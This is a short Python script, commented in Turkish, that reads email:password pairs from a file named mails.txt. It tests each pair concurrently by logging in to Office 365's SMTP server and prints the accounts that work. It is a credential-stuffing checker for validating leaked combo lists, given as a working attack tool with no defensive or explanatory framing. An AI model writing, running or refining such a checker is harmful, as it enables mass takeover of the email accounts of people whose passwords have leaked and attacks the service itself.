import smtplib
import asyncio
from concurrent.futures import ThreadPoolExecutor

# Başarılı ve başarısız denemeleri saklamak için listeler
successful_attempts = []
failed_attempts = []

def check_email_credentials(email, password):
    try:
        # SMTP sunucusuna bağlan
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.ehlo()
        server.starttls()
        server.ehlo()

        # Giriş yapmayı dene
        server.login(email, password)
        successful_attempts.append((email, password))
        server.quit()
    except smtplib.SMTPAuthenticationError:
        failed_attempts.append((email, password))
    except Exception as e:
        failed_attempts.append((email, password))

async def main():
    # mails.txt dosyasını oku
    try:
        with open('mails.txt', 'r') as file:
            lines = file.readlines()
    except:
        print("Couldn't find mails.txt file!")

    tasks = []
    loop = asyncio.get_event_loop()

    with ThreadPoolExecutor() as executor:
        for line in lines:
            email, password = line.strip().split(':')
            tasks.append(loop.run_in_executor(executor, check_email_credentials, email, password))

        await asyncio.gather(*tasks)

    # Sonuçları yazdır
    print("\nÇalışan hesap sayısı:", len(successful_attempts))
    for email, password in successful_attempts:
        print(f"{email}:{password}")

    print("\nÇalışmayan hesap sayısı:", len(failed_attempts))
    # İsterseniz başarısız girişleri de yazdırabilirsiniz
    # for email, password in failed_attempts:
    #     print(f"{email}:{password}")

if __name__ == "__main__":
    asyncio.run(main())
